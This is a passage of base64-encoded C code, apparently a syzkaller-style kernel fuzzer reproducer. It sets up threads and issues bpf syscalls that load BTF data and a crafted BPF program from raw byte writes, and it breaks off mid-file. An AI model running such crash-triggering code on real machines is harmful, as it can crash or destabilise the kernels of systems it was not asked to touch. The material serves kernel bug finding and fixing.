cy5oPg0KI2luY2x1ZGUgPHRpbWUuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0KI2luY2x1ZGUg
PGxpbnV4L2Z1dGV4Lmg+DQoNCiNpZm5kZWYgX19OUl9icGYNCiNkZWZpbmUgX19OUl9icGYgMzIx
DQojZW5kaWYNCg0Kc3RhdGljIHZvaWQgc2xlZXBfbXModWludDY0X3QgbXMpDQp7DQoJdXNsZWVw
KG1zICogMTAwMCk7DQp9DQoNCnN0YXRpYyB1aW50NjRfdCBjdXJyZW50X3RpbWVfbXModm9pZCkN
CnsNCglzdHJ1Y3QgdGltZXNwZWMgdHM7DQoJaWYgKGNsb2NrX2dldHRpbWUoQ0xPQ0tfTU9OT1RP
TklDLCAmdHMpKQ0KCWV4aXQoMSk7DQoJcmV0dXJuICh1aW50NjRfdCl0cy50dl9zZWMgKiAxMDAw
ICsgKHVpbnQ2NF90KXRzLnR2X25zZWMgLyAxMDAwMDAwOw0KfQ0KDQpzdGF0aWMgdm9pZCB0aHJl
YWRfc3RhcnQodm9pZCogKCpmbikodm9pZCopLCB2b2lkKiBhcmcpDQp7DQoJcHRocmVhZF90IHRo
Ow0KCXB0aHJlYWRfYXR0cl90IGF0dHI7DQoJcHRocmVhZF9hdHRyX2luaXQoJmF0dHIpOw0KCXB0
aHJlYWRfYXR0cl9zZXRzdGFja3NpemUoJmF0dHIsIDEyOCA8PCAxMCk7DQoJaW50IGkgPSAwOw0K
CWZvciAoOyBpIDwgMTAwOyBpKyspIHsNCgkJaWYgKHB0aHJlYWRfY3JlYXRlKCZ0aCwgJmF0dHIs
IGZuLCBhcmcpID09IDApIHsNCgkJCXB0aHJlYWRfYXR0cl9kZXN0cm95KCZhdHRyKTsNCgkJCXJl
dHVybjsNCgkJfQ0KCQlpZiAoZXJybm8gPT0gRUFHQUlOKSB7DQoJCQl1c2xlZXAoNTApOw0KCQkJ
Y29udGludWU7DQoJCX0NCgkJYnJlYWs7DQoJfQ0KCWV4aXQoMSk7DQp9DQoNCiNkZWZpbmUgQklU
TUFTSyhiZl9vZmYsYmZfbGVuKSAoKCgxdWxsIDw8IChiZl9sZW4pKSAtIDEpIDw8IChiZl9vZmYp
KQ0KI2RlZmluZSBTVE9SRV9CWV9CSVRNQVNLKHR5cGUsaHRvYmUsYWRkcix2YWwsYmZfb2ZmLGJm
X2xlbikgKih0eXBlKikoYWRkcikgPSBodG9iZSgoaHRvYmUoKih0eXBlKikoYWRkcikpICYgfkJJ
VE1BU0soKGJmX29mZiksIChiZl9sZW4pKSkgfCAoKCh0eXBlKSh2YWwpIDw8IChiZl9vZmYpKSAm
IEJJVE1BU0soKGJmX29mZiksIChiZl9sZW4pKSkpDQoNCnR5cGVkZWYgc3RydWN0IHsNCglpbnQg
c3RhdGU7DQp9IGV2ZW50X3Q7DQoNCnN0YXRpYyB2b2lkIGV2ZW50X2luaXQoZXZlbnRfdCogZXYp
DQp7DQoJZXYtPnN0YXRlID0gMDsNCn0NCg0Kc3RhdGljIHZvaWQgZXZlbnRfcmVzZXQoZXZlbnRf
dCogZXYpDQp7DQoJZXYtPnN0YXRlID0gMDsNCn0NCg0Kc3RhdGljIHZvaWQgZXZlbnRfc2V0KGV2
ZW50X3QqIGV2KQ0Kew0KCWlmIChldi0+c3RhdGUpDQoJZXhpdCgxKTsNCglfX2F0b21pY19zdG9y
ZV9uKCZldi0+c3RhdGUsIDEsIF9fQVRPTUlDX1JFTEVBU0UpOw0KCXN5c2NhbGwoU1lTX2Z1dGV4
LCAmZXYtPnN0YXRlLCBGVVRFWF9XQUtFIHwgRlVURVhfUFJJVkFURV9GTEFHLCAxMDAwMDAwKTsN
Cn0NCg0Kc3RhdGljIHZvaWQgZXZlbnRfd2FpdChldmVudF90KiBldikNCnsNCgl3aGlsZSAoIV9f
YXRvbWljX2xvYWRfbigmZXYtPnN0YXRlLCBfX0FUT01JQ19BQ1FVSVJFKSkNCgkJc3lzY2FsbChT
WVNfZnV0ZXgsICZldi0+c3RhdGUsIEZVVEVYX1dBSVQgfCBGVVRFWF9QUklWQVRFX0ZMQUcsIDAs
IDApOw0KfQ0KDQpzdGF0aWMgaW50IGV2ZW50X2lzc2V0KGV2ZW50X3QqIGV2KQ0Kew0KCXJldHVy
biBfX2F0b21pY19sb2FkX24oJmV2LT5zdGF0ZSwgX19BVE9NSUNfQUNRVUlSRSk7DQp9DQoNCnN0
YXRpYyBpbnQgZXZlbnRfdGltZWR3YWl0KGV2ZW50X3QqIGV2LCB1aW50NjRfdCB0aW1lb3V0KQ0K
ew0KCXVpbnQ2NF90IHN0YXJ0ID0gY3VycmVudF90aW1lX21zKCk7DQoJdWludDY0X3Qgbm93ID0g
c3RhcnQ7DQoJZm9yICg7Oykgew0KCQl1aW50NjRfdCByZW1haW4gPSB0aW1lb3V0IC0gKG5vdyAt
IHN0YXJ0KTsNCgkJc3RydWN0IHRpbWVzcGVjIHRzOw0KCQl0cy50dl9zZWMgPSByZW1haW4gLyAx
MDAwOw0KCQl0cy50dl9uc2VjID0gKHJlbWFpbiAlIDEwMDApICogMTAwMCAqIDEwMDA7DQoJCXN5
c2NhbGwoU1lTX2Z1dGV4LCAmZXYtPnN0YXRlLCBGVVRFWF9XQUlUIHwgRlVURVhfUFJJVkFURV9G
TEFHLCAwLCAmdHMpOw0KCQlpZiAoX19hdG9taWNfbG9hZF9uKCZldi0+c3RhdGUsIF9fQVRPTUlD
X0FDUVVJUkUpKQ0KCQkJcmV0dXJuIDE7DQoJCW5vdyA9IGN1cnJlbnRfdGltZV9tcygpOw0KCQlp
ZiAobm93IC0gc3RhcnQgPiB0aW1lb3V0KQ0KCQkJcmV0dXJuIDA7DQoJfQ0KfQ0KDQpzdHJ1Y3Qg
dGhyZWFkX3Qgew0KCWludCBjcmVhdGVkLCBjYWxsOw0KCWV2ZW50X3QgcmVhZHksIGRvbmU7DQp9
Ow0KDQpzdGF0aWMgc3RydWN0IHRocmVhZF90IHRocmVhZHNbMTZdOw0Kc3RhdGljIHZvaWQgZXhl
Y3V0ZV9jYWxsKGludCBjYWxsKTsNCnN0YXRpYyBpbnQgcnVubmluZzsNCg0Kc3RhdGljIHZvaWQq
IHRocih2b2lkKiBhcmcpDQp7DQoJc3RydWN0IHRocmVhZF90KiB0aCA9IChzdHJ1Y3QgdGhyZWFk
X3QqKWFyZzsNCglmb3IgKDs7KSB7DQoJCWV2ZW50X3dhaXQoJnRoLT5yZWFkeSk7DQoJCWV2ZW50
X3Jlc2V0KCZ0aC0+cmVhZHkpOw0KCQlleGVjdXRlX2NhbGwodGgtPmNhbGwpOw0KCQlfX2F0b21p
Y19mZXRjaF9zdWIoJnJ1bm5pbmcsIDEsIF9fQVRPTUlDX1JFTEFYRUQpOw0KCQlldmVudF9zZXQo
JnRoLT5kb25lKTsNCgl9DQoJcmV0dXJuIDA7DQp9DQoNCnN0YXRpYyB2b2lkIGxvb3Aodm9pZCkN
CnsNCglpZiAod3JpdGUoMSwgImV4ZWN1dGluZyBwcm9ncmFtXG4iLCBzaXplb2YoImV4ZWN1dGlu
ZyBwcm9ncmFtXG4iKSAtIDEpKSB7DQoJfQ0KCWludCBpLCBjYWxsLCB0aHJlYWQ7DQoJZm9yIChj
YWxsID0gMDsgY2FsbCA8IDM7IGNhbGwrKykgew0KCQlmb3IgKHRocmVhZCA9IDA7IHRocmVhZCA8
IChpbnQpKHNpemVvZih0aHJlYWRzKSAvIHNpemVvZih0aHJlYWRzWzBdKSk7IHRocmVhZCsrKSB7
DQoJCQlzdHJ1Y3QgdGhyZWFkX3QqIHRoID0gJnRocmVhZHNbdGhyZWFkXTsNCgkJCWlmICghdGgt
PmNyZWF0ZWQpIHsNCgkJCQl0aC0+Y3JlYXRlZCA9IDE7DQoJCQkJZXZlbnRfaW5pdCgmdGgtPnJl
YWR5KTsNCgkJCQlldmVudF9pbml0KCZ0aC0+ZG9uZSk7DQoJCQkJZXZlbnRfc2V0KCZ0aC0+ZG9u
ZSk7DQoJCQkJdGhyZWFkX3N0YXJ0KHRociwgdGgpOw0KCQkJfQ0KCQkJaWYgKCFldmVudF9pc3Nl
dCgmdGgtPmRvbmUpKQ0KCQkJCWNvbnRpbnVlOw0KCQkJZXZlbnRfcmVzZXQoJnRoLT5kb25lKTsN
CgkJCXRoLT5jYWxsID0gY2FsbDsNCgkJCV9fYXRvbWljX2ZldGNoX2FkZCgmcnVubmluZywgMSwg
X19BVE9NSUNfUkVMQVhFRCk7DQoJCQlldmVudF9zZXQoJnRoLT5yZWFkeSk7DQoJCQlpZiAoY2Fs
bCA9PSAxKQ0KCQkJCWJyZWFrOw0KCQkJZXZlbnRfdGltZWR3YWl0KCZ0aC0+ZG9uZSwgNTApOw0K
CQkJYnJlYWs7DQoJCX0NCgl9DQoJZm9yIChpID0gMDsgaSA8IDEwMCAmJiBfX2F0b21pY19sb2Fk
X24oJnJ1bm5pbmcsIF9fQVRPTUlDX1JFTEFYRUQpOyBpKyspDQoJCXNsZWVwX21zKDEpOw0KfQ0K
DQp1aW50NjRfdCByWzFdID0gezB4ZmZmZmZmZmZmZmZmZmZmZn07DQoNCnZvaWQgZXhlY3V0ZV9j
YWxsKGludCBjYWxsKQ0Kew0KCQlpbnRwdHJfdCByZXMgPSAwOw0KCXN3aXRjaCAoY2FsbCkgew0K
CWNhc2UgMDoNCioodWludDY0X3QqKTB4MjAwMDRlNDAgPSAweDIwMDA0YzgwOw0KKih1aW50MTZf
dCopMHgyMDAwNGM4MCA9IDB4ZWI5ZjsNCioodWludDhfdCopMHgyMDAwNGM4MiA9IDE7DQoqKHVp
bnQ4X3QqKTB4MjAwMDRjODMgPSAwOw0KKih1aW50MzJfdCopMHgyMDAwNGM4NCA9IDB4MTg7DQoq
KHVpbnQzMl90KikweDIwMDA0Yzg4ID0gMDsNCioodWludDMyX3QqKTB4MjAwMDRjOGMgPSAweGM7
DQoqKHVpbnQzMl90KikweDIwMDA0YzkwID0gMHhjOw0KKih1aW50MzJfdCopMHgyMDAwNGM5NCA9
IDB4YTsNCioodWludDMyX3QqKTB4MjAwMDRjOTggPSA4Ow0KKih1aW50MTZfdCopMHgyMDAwNGM5
YyA9IDA7DQoqKHVpbnQ4X3QqKTB4MjAwMDRjOWUgPSAwOw0KU1RPUkVfQllfQklUTUFTSyh1aW50
OF90LCAsIDB4MjAwMDRjOWYsIDUsIDAsIDcpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAs
IDB4MjAwMDRjOWYsIDAsIDcsIDEpOw0KKih1aW50MzJfdCopMHgyMDAwNGNhMCA9IDY7DQoqKHVp
bnQ4X3QqKTB4MjAwMDRjYTQgPSAwOw0KKih1aW50OF90KikweDIwMDA0Y2E1ID0gMHgzMDsNCioo
dWludDhfdCopMHgyMDAwNGNhNiA9IDA7DQoqKHVpbnQ4X3QqKTB4MjAwMDRjYTcgPSAweDMwOw0K
Kih1aW50OF90KikweDIwMDA0Y2E4ID0gMHg2MTsNCioodWludDhfdCopMHgyMDAwNGNhOSA9IDB4
MWU7DQoqKHVpbnQ4X3QqKTB4MjAwMDRjYWEgPSAweDJmOw0KKih1aW50OF90KikweDIwMDA0Y2Fi
ID0gMHgzMDsNCioodWludDhfdCopMHgyMDAwNGNhYyA9IDB4MmU7DQoqKHVpbnQ4X3QqKTB4MjAw
MDRjYWQgPSAwOw0KKih1aW50NjRfdCopMHgyMDAwNGU0OCA9IDA7DQoqKHVpbnQzMl90KikweDIw
MDA0ZTUwID0gMHgyZTsNCioodWludDMyX3QqKTB4MjAwMDRlNTQgPSAwOw0KKih1aW50MzJfdCop
MHgyMDAwNGU1OCA9IDE7DQoqKHVpbnQzMl90KikweDIwMDA0ZTVjID0gMHg0MDsNCgkJcmVzID0g
c3lzY2FsbChfX05SX2JwZiwgLypjbWQ9Ki8weDEydWwsIC8qYXJnPSovMHgyMDAwNGU0MHVsLCAv
KnNpemU9Ki8weDIwdWwpOw0KCQlpZiAocmVzICE9IC0xKQ0KCQkJCXJbMF0gPSByZXM7DQoJCWJy
ZWFrOw0KCWNhc2UgMToNCioodWludDMyX3QqKTB4MjAwMDA0ODAgPSA2Ow0KKih1aW50MzJfdCop
MHgyMDAwMDQ4NCA9IDB4Mjc7DQoqKHVpbnQ2NF90KikweDIwMDAwNDg4ID0gMHgyMDAwMGQ0MDsN
CioodWludDhfdCopMHgyMDAwMGQ0MCA9IDB4MTg7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3Qs
ICwgMHgyMDAwMGQ0MSwgMCwgMCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgy
MDAwMGQ0MSwgMCwgNCwgNCk7DQoqKHVpbnQxNl90KikweDIwMDAwZDQyID0gMDsNCioodWludDMy
X3QqKTB4MjAwMDBkNDQgPSA4Ow0KKih1aW50OF90KikweDIwMDAwZDQ4ID0gMDsNCioodWludDhf
dCopMHgyMDAwMGQ0OSA9IDA7DQoqKHVpbnQxNl90KikweDIwMDAwZDRhID0gMDsNCioodWludDMy
X3QqKTB4MjAwMDBkNGMgPSA3Ow0KKih1aW50OF90KikweDIwMDAwZDUwID0gMHgxODsNClNUT1JF
X0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZDUxLCAxLCAwLCA0KTsNClNUT1JFX0JZX0JJ
VE1BU0sodWludDhfdCwgLCAweDIwMDAwZDUxLCAxLCA0LCA0KTsNCioodWludDE2X3QqKTB4MjAw
MDBkNTIgPSAwOw0KKih1aW50MzJfdCopMHgyMDAwMGQ1NCA9IC0xOw0KKih1aW50OF90KikweDIw
MDAwZDU4ID0gMDsNCioodWludDhfdCopMHgyMDAwMGQ1OSA9IDA7DQoqKHVpbnQxNl90KikweDIw
MDAwZDVhID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBkNWMgPSAwOw0KU1RPUkVfQllfQklUTUFT
Syh1aW50OF90LCAsIDB4MjAwMDBkNjAsIDcsIDAsIDMpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50
OF90LCAsIDB4MjAwMDBkNjAsIDAsIDMsIDEpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAs
IDB4MjAwMDBkNjAsIDB4YiwgNCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgy
MDAwMGQ2MSwgMiwgMCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGQ2
MSwgMCwgNCwgNCk7DQoqKHVpbnQxNl90KikweDIwMDAwZDYyID0gMDsNCioodWludDMyX3QqKTB4
MjAwMDBkNjQgPSAweDE0Ow0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNjgs
IDcsIDAsIDMpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNjgsIDAsIDMs
IDEpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNjgsIDB4YiwgNCwgNCk7
DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGQ2OSwgMywgMCwgNCk7DQpTVE9S
RV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGQ2OSwgMCwgNCwgNCk7DQoqKHVpbnQxNl90
KikweDIwMDAwZDZhID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBkNmMgPSAwOw0KKih1aW50OF90
KikweDIwMDAwZDcwID0gMHg4NTsNCioodWludDhfdCopMHgyMDAwMGQ3MSA9IDA7DQoqKHVpbnQx
Nl90KikweDIwMDAwZDcyID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBkNzQgPSAweDgzOw0KU1RP
UkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNzgsIDcsIDAsIDMpOw0KU1RPUkVfQllf
QklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkNzgsIDEsIDMsIDEpOw0KU1RPUkVfQllfQklUTUFT
Syh1aW50OF90LCAsIDB4MjAwMDBkNzgsIDB4YiwgNCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVp
bnQ4X3QsICwgMHgyMDAwMGQ3OSwgOSwgMCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3Qs
ICwgMHgyMDAwMGQ3OSwgMCwgNCwgNCk7DQoqKHVpbnQxNl90KikweDIwMDAwZDdhID0gMDsNCioo
dWludDMyX3QqKTB4MjAwMDBkN2MgPSAwOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4
MjAwMDBkODAsIDUsIDAsIDMpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBk
ODAsIDAsIDMsIDEpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkODAsIDUs
IDQsIDQpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkODEsIDksIDAsIDQp
Ow0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkODEsIDAsIDQsIDQpOw0KKih1
aW50MTZfdCopMHgyMDAwMGQ4MiA9IDE7DQoqKHVpbnQzMl90KikweDIwMDAwZDg0ID0gMDsNCioo
dWludDhfdCopMHgyMDAwMGQ4OCA9IDB4OTU7DQoqKHVpbnQ4X3QqKTB4MjAwMDBkODkgPSAwOw0K
Kih1aW50MTZfdCopMHgyMDAwMGQ4YSA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwZDhjID0gMDsN
CioodWludDhfdCopMHgyMDAwMGQ5MCA9IDB4MTg7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3Qs
ICwgMHgyMDAwMGQ5MSwgMSwgMCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgy
MDAwMGQ5MSwgMSwgNCwgNCk7DQoqKHVpbnQxNl90KikweDIwMDAwZDkyID0gMDsNCioodWludDMy
X3QqKTB4MjAwMDBkOTQgPSAtMTsNCioodWludDhfdCopMHgyMDAwMGQ5OCA9IDA7DQoqKHVpbnQ4
X3QqKTB4MjAwMDBkOTkgPSAwOw0KKih1aW50MTZfdCopMHgyMDAwMGQ5YSA9IDA7DQoqKHVpbnQz
Ml90KikweDIwMDAwZDljID0gMDsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAw
ZGEwLCA3LCAwLCAzKTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGEwLCAw
LCAzLCAxKTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGEwLCAweGIsIDQs
IDQpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkYTEsIDIsIDAsIDQpOw0K
U1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBkYTEsIDAsIDQsIDQpOw0KKih1aW50
MTZfdCopMHgyMDAwMGRhMiA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwZGE0ID0gMDsNCioodWlu
dDhfdCopMHgyMDAwMGRhOCA9IDB4ODU7DQoqKHVpbnQ4X3QqKTB4MjAwMDBkYTkgPSAwOw0KKih1
aW50MTZfdCopMHgyMDAwMGRhYSA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwZGFjID0gMHg4NjsN
CioodWludDhfdCopMHgyMDAwMGRiMCA9IDB4MTg7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3Qs
ICwgMHgyMDAwMGRiMSwgMSwgMCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgy
MDAwMGRiMSwgMCwgNCwgNCk7DQoqKHVpbnQxNl90KikweDIwMDAwZGIyID0gMDsNCioodWludDMy
X3QqKTB4MjAwMDBkYjQgPSAweDI1NzAyMDIwOw0KKih1aW50OF90KikweDIwMDAwZGI4ID0gMDsN
CioodWludDhfdCopMHgyMDAwMGRiOSA9IDA7DQoqKHVpbnQxNl90KikweDIwMDAwZGJhID0gMDsN
CioodWludDMyX3QqKTB4MjAwMDBkYmMgPSAweDIwMjAyMDAwOw0KU1RPUkVfQllfQklUTUFTSyh1
aW50OF90LCAsIDB4MjAwMDBkYzAsIDMsIDAsIDMpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90
LCAsIDB4MjAwMDBkYzAsIDMsIDMsIDIpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4
MjAwMDBkYzAsIDMsIDUsIDMpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBk
YzEsIDB4YSwgMCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRjMSwg
MSwgNCwgNCk7DQoqKHVpbnQxNl90KikweDIwMDAwZGMyID0gMHhmZmY4Ow0KKih1aW50MzJfdCop
MHgyMDAwMGRjNCA9IDA7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRjOCwg
NywgMCwgMyk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRjOCwgMSwgMywg
MSk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRjOCwgMHhiLCA0LCA0KTsN
ClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGM5LCAxLCAwLCA0KTsNClNUT1JF
X0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGM5LCAweGEsIDQsIDQpOw0KKih1aW50MTZf
dCopMHgyMDAwMGRjYSA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwZGNjID0gMDsNClNUT1JFX0JZ
X0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGQwLCA3LCAwLCAzKTsNClNUT1JFX0JZX0JJVE1B
U0sodWludDhfdCwgLCAweDIwMDAwZGQwLCAwLCAzLCAxKTsNClNUT1JFX0JZX0JJVE1BU0sodWlu
dDhfdCwgLCAweDIwMDAwZGQwLCAwLCA0LCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwg
LCAweDIwMDAwZGQxLCAxLCAwLCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIw
MDAwZGQxLCAwLCA0LCA0KTsNCioodWludDE2X3QqKTB4MjAwMDBkZDIgPSAwOw0KKih1aW50MzJf
dCopMHgyMDAwMGRkNCA9IDB4ZmZmZmZmZjg7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwg
MHgyMDAwMGRkOCwgNywgMCwgMyk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAw
MGRkOCwgMCwgMywgMSk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRkOCwg
MHhiLCA0LCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGQ5LCAyLCAw
LCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZGQ5LCAwLCA0LCA0KTsN
CioodWludDE2X3QqKTB4MjAwMDBkZGEgPSAwOw0KKih1aW50MzJfdCopMHgyMDAwMGRkYyA9IDg7
DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRlMCwgNywgMCwgMyk7DQpTVE9S
RV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRlMCwgMCwgMywgMSk7DQpTVE9SRV9CWV9C
SVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRlMCwgMHhiLCA0LCA0KTsNClNUT1JFX0JZX0JJVE1B
U0sodWludDhfdCwgLCAweDIwMDAwZGUxLCAzLCAwLCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWlu
dDhfdCwgLCAweDIwMDAwZGUxLCAwLCA0LCA0KTsNCioodWludDE2X3QqKTB4MjAwMDBkZTIgPSAw
Ow0KKih1aW50MzJfdCopMHgyMDAwMGRlNCA9IDB4ZmZmZjsNCioodWludDhfdCopMHgyMDAwMGRl
OCA9IDB4ODU7DQoqKHVpbnQ4X3QqKTB4MjAwMDBkZTkgPSAwOw0KKih1aW50MTZfdCopMHgyMDAw
MGRlYSA9IDA7DQoqKHVpbnQzMl90KikweDIwMDAwZGVjID0gNjsNCioodWludDhfdCopMHgyMDAw
MGRmMCA9IDB4MTg7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRmMSwgMSwg
MCwgNCk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGRmMSwgMCwgNCwgNCk7
DQoqKHVpbnQxNl90KikweDIwMDAwZGYyID0gMDsNCioodWludDMyX3QqKTB4MjAwMDBkZjQgPSAw
eDI1NmM2YzY0Ow0KKih1aW50OF90KikweDIwMDAwZGY4ID0gMDsNCioodWludDhfdCopMHgyMDAw
MGRmOSA9IDA7DQoqKHVpbnQxNl90KikweDIwMDAwZGZhID0gMDsNCioodWludDMyX3QqKTB4MjAw
MDBkZmMgPSAweDIwMjAyMDAwOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBl
MDAsIDMsIDAsIDMpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMDAsIDMs
IDMsIDIpOw0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMDAsIDMsIDUsIDMp
Ow0KU1RPUkVfQllfQklUTUFTSyh1aW50OF90LCAsIDB4MjAwMDBlMDEsIDB4YSwgMCwgNCk7DQpT
VE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUwMSwgMSwgNCwgNCk7DQoqKHVpbnQx
Nl90KikweDIwMDAwZTAyID0gMHhmZmY4Ow0KKih1aW50MzJfdCopMHgyMDAwMGUwNCA9IDA7DQpT
VE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUwOCwgNywgMCwgMyk7DQpTVE9SRV9C
WV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUwOCwgMSwgMywgMSk7DQpTVE9SRV9CWV9CSVRN
QVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUwOCwgMHhiLCA0LCA0KTsNClNUT1JFX0JZX0JJVE1BU0so
dWludDhfdCwgLCAweDIwMDAwZTA5LCAxLCAwLCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhf
dCwgLCAweDIwMDAwZTA5LCAweGEsIDQsIDQpOw0KKih1aW50MTZfdCopMHgyMDAwMGUwYSA9IDA7
DQoqKHVpbnQzMl90KikweDIwMDAwZTBjID0gMDsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwg
LCAweDIwMDAwZTEwLCA3LCAwLCAzKTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIw
MDAwZTEwLCAwLCAzLCAxKTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTEw
LCAwLCA0LCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTExLCAxLCAw
LCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTExLCAwLCA0LCA0KTsN
CioodWludDE2X3QqKTB4MjAwMDBlMTIgPSAwOw0KKih1aW50MzJfdCopMHgyMDAwMGUxNCA9IDB4
ZmZmZmZmZjg7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUxOCwgNywgMCwg
Myk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUxOCwgMCwgMywgMSk7DQpT
VE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwgMHgyMDAwMGUxOCwgMHhiLCA0LCA0KTsNClNUT1JF
X0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTE5LCAyLCAwLCA0KTsNClNUT1JFX0JZX0JJ
VE1BU0sodWludDhfdCwgLCAweDIwMDAwZTE5LCAwLCA0LCA0KTsNCioodWludDE2X3QqKTB4MjAw
MDBlMWEgPSAwOw0KKih1aW50MzJfdCopMHgyMDAwMGUxYyA9IDg7DQpTVE9SRV9CWV9CSVRNQVNL
KHVpbnQ4X3QsICwgMHgyMDAwMGUyMCwgNywgMCwgMyk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4
X3QsICwgMHgyMDAwMGUyMCwgMCwgMywgMSk7DQpTVE9SRV9CWV9CSVRNQVNLKHVpbnQ4X3QsICwg
MHgyMDAwMGUyMCwgMHhiLCA0LCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIw
MDAwZTIxLCAzLCAwLCA0KTsNClNUT1JFX0JZX0JJVE1BU0sodWludDhfdCwgLCAweDIwMDAwZTIx
LCAwLCA0LCA0KTsNCioodWludDE2X3QqKTB4MjAwMDBlMjIgPSAwOw0KKih1aW50MzJfdCopMHgy
MDAwMGUyNCA9IDc7DQoqKHVpbnQ4X3QqKTB4MjAwMDBlMjggPSAweDg1Ow0KKih1aW50OF90Kikw
